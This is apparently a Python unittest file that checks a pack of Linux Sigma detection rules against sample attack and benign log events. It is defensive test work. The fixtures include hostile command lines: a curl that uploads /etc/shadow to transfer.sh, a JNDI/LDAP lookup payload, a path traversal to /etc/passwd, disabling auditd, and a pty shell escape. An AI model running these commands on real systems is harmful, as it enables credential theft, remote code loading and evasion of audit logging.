"""Linux Sigma pack: each example loads, maps one catalog technique, and ignores benign host activity."""

import unittest
from pathlib import Path

from watchpost import sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "linux"

FILES = (
    "direct_root_ssh.yml",
    "exfil_web_service.yml",
    "logging_audit_tamper.yml",
    "network_scanner.yml",
    "ssh_invalid_user.yml",
    "ssh_login_from_external.yml",
    "sudo_or_su_shell.yml",
    "web_exploit_payload.yml",
)

# Ordinary host activity from the sample logs. No rule in the pack should match these.
EVERYDAY = (
    {
        "event_type": "auth_success",
        "user": "erin",
        "src_ip": "10.0.1.24",
        "host": "mail01",
        "message": "Accepted password for erin from 10.0.1.24 port 51022 ssh2",
    },
    {
        "event_type": "auth_failure",
        "user": "frank",
        "src_ip": "192.0.2.140",
        "host": "web01",
        "message": "Failed password for frank from 192.0.2.140 port 40100 ssh2",
    },
    {
        "event_type": "privilege_escalation",
        "user": "grace",
        "host": "web01",
        "message": "grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
    },
    {
        "event_type": "process_start",
        "user": "frank",
        "host": "web01",
        "message": 'type=SYSCALL arch=c000003e syscall=59 success=yes exe="/usr/bin/curl" AUID="frank"',
    },
    {
        "event_type": "web_request",
        "src_ip": "10.0.1.20",
        "host": "web01",
        "message": "GET /index.html -> 200 ua=Mozilla/5.0 (X11; Linux x86_64)",
    },
)


def compiled(name):
    return sigma.compile_rule((PACK / name).read_text())


class LinuxSigmaPackTests(unittest.TestCase):
    def assert_rule(self, name, technique, rule_id, hits, misses):
        got = compiled(name)
        self.assertEqual(got["rule_id"], rule_id)
        self.assertEqual([t["id"] for t in got["techniques"]], [technique])
        params = got["params"]
        for event in hits:
            self.assertTrue(sigma.matches(params, event), event["message"])
        for event in (*misses, *EVERYDAY):
            self.assertFalse(sigma.matches(params, event), event["message"])

    def test_pack_is_the_eight_rules(self):
        names = sorted(p.name for p in PACK.iterdir() if p.is_file())
        self.assertEqual(names, list(FILES))

    def test_ssh_login_from_external(self):
        self.assert_rule(
            "ssh_login_from_external.yml",
            "T1133",
            "sigma_linux_ssh_login_from_external_address",
            hits=[{
                "event_type": "auth_success",
                "user": "deploy",
                "src_ip": "203.0.113.50",
                "host": "web01",
                "message": "Accepted publickey for deploy from 203.0.113.50 port 50100 ssh2",
            }],
            misses=[{
                "event_type": "auth_failure",
                "user": "deploy",
                "src_ip": "203.0.113.50",
                "host": "web01",
                "message": "Failed password for deploy from 203.0.113.50 port 50100 ssh2",
            }],
        )

    def test_direct_root_ssh(self):
        self.assert_rule(
            "direct_root_ssh.yml",
            "T1078.003",
            "sigma_linux_direct_root_ssh_login",
            hits=[{
                "event_type": "auth_success",
                "user": "root",
                "src_ip": "10.0.1.5",
                "host": "web01",
                "message": "Accepted password for root from 10.0.1.5 port 22 ssh2",
            }],
            misses=[{
                "event_type": "auth_failure",
                "user": "root",
                "src_ip": "203.0.113.9",
                "host": "web01",
                "message": "Failed password for root from 203.0.113.9 port 22 ssh2",
            }],
        )

    def test_sudo_or_su_shell(self):
        self.assert_rule(
            "sudo_or_su_shell.yml",
            "T1548.003",
            "sigma_linux_sudo_or_su_to_interactive_shell",
            hits=[
                {
                    "event_type": "privilege_escalation",
                    "user": "frank",
                    "host": "web01",
                    "message": "frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/bash",
                },
                {
                    "event_type": "privilege_escalation",
                    "user": "frank",
                    "host": "web01",
                    "message": "frank : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c import pty",
                },
                {
                    "event_type": "privilege_escalation",
                    "user": "frank",
                    "host": "web01",
                    "message": "(to root) frank on pts/0",
                },
            ],
            misses=[{
                "event_type": "privilege_escalation",
                "user": "grace",
                "host": "web01",
                "message": "grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/bin/sha256sum /etc/hostname",
            }],
        )

    def test_ssh_invalid_user(self):
        self.assert_rule(
            "ssh_invalid_user.yml",
            "T1110.001",
            "sigma_linux_ssh_authentication_for_invalid_user",
            hits=[
                {
                    "event_type": "auth_failure",
                    "user": "admin",
                    "src_ip": "203.0.113.9",
                    "host": "web01",
                    "message": "Failed password for invalid user admin from 203.0.113.9 port 44422 ssh2",
                },
                {
                    "event_type": "auth_failure",
                    "user": "oracle",
                    "src_ip": "198.51.100.8",
                    "host": "web01",
                    "message": "Invalid user oracle from 198.51.100.8 port 44022",
                },
            ],
            misses=[{
                "event_type": "auth_failure",
                "user": "root",
                "src_ip": "203.0.113.9",
                "host": "web01",
                "message": "Failed password for root from 203.0.113.9 port 22 ssh2",
            }],
        )

    def test_network_scanner(self):
        self.assert_rule(
            "network_scanner.yml",
            "T1046",
            "sigma_linux_network_scanner_execution",
            hits=[
                {
                    "event_type": "process_start",
                    "user": "frank",
                    "host": "web01",
                    "message": 'type=SYSCALL arch=c000003e syscall=59 success=yes exe="/usr/bin/nmap" AUID="frank"',
                },
                {
                    "event_type": "privilege_escalation",
                    "user": "grace",
                    "host": "web01",
                    "message": "grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/nmap -sS 10.0.0.0/24",
                },
                {
                    "event_type": "privilege_escalation",
                    "user": "grace",
                    "host": "web01",
                    "message": "grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/masscan",
                },
            ],
            misses=[{
                "event_type": "web_scan",
                "src_ip": "203.0.113.40",
                "host": "web01",
                "message": "GET / -> 404 ua=Nmap Scripting Engine",
            }],
        )

    def test_web_exploit_payload(self):
        self.assert_rule(
            "web_exploit_payload.yml",
            "T1190",
            "sigma_linux_web_exploit_payload",
            hits=[
                {
                    "event_type": "web_scan",
                    "src_ip": "203.0.113.77",
                    "host": "web01",
                    "message": "GET /vendor/../../etc/passwd -> 400",
                },
                {
                    "event_type": "web_request",
                    "src_ip": "203.0.113.77",
                    "host": "web01",
                    "message": "GET / -> 200 ua=${jndi:ldap://203.0.113.77/a}",
                },
            ],
            misses=[{
                "event_type": "file_access",
                "user": "frank",
                "host": "web01",
                "message": 'type=PATH item=0 name="/etc/passwd" nametype=NORMAL',
            }],
        )

    def test_logging_audit_tamper(self):
        self.assert_rule(
            "logging_audit_tamper.yml",
            "T1562.006",
            "sigma_linux_logging_and_audit_tamper",
            hits=[{
                "event_type": "privilege_escalation",
                "user": "frank",
                "host": "web01",
                "message": "frank : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/auditctl -e 0",
            }],
            misses=[
                {
                    "event_type": "privilege_escalation",
                    "user": "frank",
                    "host": "web01",
                    "message": "frank : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl status auditd",
                },
                {
                    "event_type": "privilege_escalation",
                    "user": "frank",
                    "host": "web01",
                    "message": "frank : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart rsyslog",
                },
            ],
        )

    def test_exfil_web_service(self):
        self.assert_rule(
            "exfil_web_service.yml",
            "T1567",
            "sigma_linux_exfiltration_to_web_service",
            hits=[{
                "event_type": "privilege_escalation",
                "user": "frank",
                "host": "web01",
                "message": "frank : TTY=pts/0 ; PWD=/tmp ; USER=root ; "
                           "COMMAND=/usr/bin/curl https://transfer.sh/abc -T /etc/shadow",
            }],
            misses=[
                {
                    "event_type": "privilege_escalation",
                    "user": "frank",
                    "host": "web01",
                    "message": "frank : TTY=pts/0 ; PWD=/tmp ; USER=root ; "
                               "COMMAND=/usr/bin/curl https://github.com/watchpost/install.sh -O",
                },
                {
                    "event_type": "syslog",
                    "host": "web01",
                    "message": "note saved https://transfer.sh/readme for later",
                },
            ],
        )
